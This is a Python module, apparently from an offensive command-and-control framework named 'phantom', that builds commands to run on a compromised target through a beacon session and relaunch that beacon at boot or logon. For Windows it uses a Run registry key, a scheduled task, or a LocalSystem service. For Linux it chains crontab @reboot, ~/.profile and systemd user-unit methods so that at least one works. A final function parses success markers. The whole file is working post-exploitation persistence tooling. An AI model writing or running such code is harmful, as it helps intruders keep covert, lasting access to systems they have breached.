"""
persistence.py — persistence command builders and interpreters.

These commands are queued as tasks to the established beacon session and
execute on the TARGET host, so they are platform-aware (Windows vs Linux)
and re-launch the beacon at boot / logon / cron.
"""

from __future__ import annotations

from typing import Any, Dict, List

from phantom.automation.belief import Finding, WorldModel


def windows_persist_command(method: str, payload: str) -> str:
    if method == "runkey":
        return (f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" '
                f'/v PhantomBeacon /t REG_SZ /d "{payload}" /f && '
                f'echo PERSISTENCE_OK runkey')
    if method == "scheduled_task":
        return (f'schtasks /create /tn "PhantomUpdate" /tr "{payload}" '
                f'/sc onlogon /f && echo PERSISTENCE_OK scheduled_task')
    # default: Windows service (runs at boot, often as SYSTEM)
    return (f'sc create PhantomUpdate binPath= "cmd /c {payload}" '
            f'start= auto obj= LocalSystem && sc start PhantomUpdate && '
            f'echo PERSISTENCE_OK service')


def linux_persist_command(method: str, payload: str) -> str:
    if method == "cron":
        # cron first, then .profile, then a systemd user unit — a minimal
        # target (container, stripped distro) often lacks `crontab` or
        # systemd; the chain guarantees a persistence marker whenever ANY
        # of the mechanisms exists.
        cron = (f'(crontab -l 2>/dev/null; echo "@reboot {payload}") | '
                f'crontab - 2>/dev/null && echo PERSISTENCE_OK cron')
        profile = (f'echo "{payload}" >> ~/.profile '
                   f'&& echo PERSISTENCE_OK profile')
        unit = (
            f"[Unit]\nDescription=Phantom Beacon\n"
            f"[Service]\nExecStart={payload}\nRestart=always\n"
            f"[Install]\nWantedBy=default.target"
        )
        systemd = (f"mkdir -p ~/.config/systemd/user && "
                   f"printf '%s' '{unit}' > ~/.config/systemd/user/phantom-beacon.service "
                   f"&& (systemctl --user enable phantom-beacon.service 2>/dev/null || true) "
                   f"&& echo PERSISTENCE_OK systemd")
        return f"({cron}) || ({profile}) || ({systemd}) || echo PERSISTENCE_FAILED all"
    if method == "profile":
        return (f'echo "{payload}" >> ~/.profile && echo PERSISTENCE_OK profile')
    # default: systemd unit, restarts the beacon at boot
    unit = (
        f"[Unit]\nDescription=Phantom Beacon\n"
        f"[Service]\nExecStart={payload}\nRestart=always\n"
        f"[Install]\nWantedBy=default.target"
    )
    return (f"mkdir -p ~/.config/systemd/user && "
            f"printf '%s' '{unit}' > ~/.config/systemd/user/phantom-beacon.service "
            f"&& (systemctl --user enable phantom-beacon.service 2>/dev/null || true) "
            f"&& echo PERSISTENCE_OK systemd")


def persistence_interpreter(output: str, wm: WorldModel, slots: Dict[str, Any]) -> List[Finding]:
    """A persistence finding is confirmed only when the beacon reports the
    PERSISTENCE_OK marker (real task output from the target)."""
    if "PERSISTENCE_OK" not in output:
        return []
    method = "auto"
    for m in ("runkey", "scheduled_task", "service", "cron", "profile", "systemd"):
        if f"PERSISTENCE_OK {m}" in output:
            method = m
            break
    return [Finding(kind="persistence", key=method,
                    value={"method": method, "os": slots.get("os", "")},
                    confidence=0.9, source="persistence_install",
                    evidence=output.strip()[:200])]
